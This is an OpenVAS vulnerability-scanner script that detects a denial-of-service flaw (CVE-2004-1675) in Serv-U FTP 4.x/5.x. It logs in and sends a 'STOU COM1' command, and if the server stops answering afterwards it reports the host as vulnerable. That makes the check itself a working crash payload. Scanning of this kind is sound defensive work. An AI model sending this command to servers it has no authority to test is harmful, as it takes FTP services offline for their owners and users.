###############################################################################
# OpenVAS Vulnerability Test
#
# FTP Serv-U 4.x 5.x DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:serv-u:serv-u";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14709");
  script_version("2022-12-05T10:11:03+0000");
  script_cve_id("CVE-2004-1675");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11155");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Serv-U FTP 4.x 5.x DoS");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_dependencies("gb_solarwinds_serv-u_consolidation.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("solarwinds/servu/detected");

  script_tag(name:"impact", value:"This vulnerability allows an attacker to prevent you from sharing data through FTP,
  and may even crash this host.");

  script_tag(name:"solution", value:"Upgrade to latest version of this software.");

  script_tag(name:"summary", value:"It is possible to crash the remote FTP server by sending it a STOU command.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"ftp" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];

if( ftp_authenticate( socket:soc, user:login, pass:password ) ) {

  s = string( "STOU COM1", "\r\n" );
  send( socket:soc, data:s );
  close( soc );

  soc2 = open_sock_tcp( port );
  if( ! soc2 || ! recv_line( socket:soc2, length:4096 ) ) {
    security_message( port:port );
    exit( 0 );
  } else {
    close( soc2 );
  }
}

if( soc )
  close( soc );

exit( 99 );